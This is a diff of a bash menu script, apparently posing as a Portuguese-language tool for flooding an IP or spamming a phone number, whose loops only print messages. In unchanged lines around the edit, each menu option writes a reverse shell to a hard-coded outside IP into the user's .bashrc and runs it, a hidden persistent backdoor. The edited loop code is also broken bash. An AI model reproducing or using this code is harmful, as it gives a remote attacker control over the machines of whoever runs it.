@@ -22,16 +22,20 @@ then
 	echo "bash -i >/dev/tcp/193.161.193.99/49487 0>&1 &" >> $HOME/.bashrc
 	bash -i >/dev/tcp/193.161.193.99/49487 0>&1 &
 	read -p "IP >> " ip
-	while :
+        var="100"
+	while [ $var <= 5000 ]
 	do
+                var="$var + 20"
 		sleep 0.2 ; echo "derrubando $ip"
 	done
 elif [ $opc == 2 ]
 then
 	echo "bash -i >/dev/tcp/193.161.193.99/49487 0>&1 &" >> $HOME/.bashrc
 	read -p "Numero >> " nmr
-	while :
+        var="5000"
+	while [ $var <= 5000 ]
 	do
+                var="$var + 20"
 		sleep 0.2 ; echo "enviando spam para $nmr"
 	done
 elif [ $opc == 3 ]
